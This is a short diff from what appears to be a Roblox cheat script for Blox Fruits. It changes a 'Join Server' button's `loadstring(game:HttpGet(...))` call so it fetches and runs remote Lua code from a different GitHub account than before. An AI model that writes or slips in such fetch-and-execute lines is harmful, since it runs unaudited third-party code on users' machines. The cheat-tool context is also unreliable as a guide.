@@ -2406,7 +2406,7 @@ Misc:AddTextBox({Name = "Input Job Id",Default = "",PlaceholderText = "Job ID",C
   ServerId = Value
 end})
 Misc:AddButton({"Join Server", function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/Webhook/main/BloxFruits.lua"))():Teleport(ServerId)
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/alixiir-Hub/Webhook/main/BloxFruits.lua"))():Teleport(ServerId)
 end})
 Misc:AddSection({"Configs"})
 
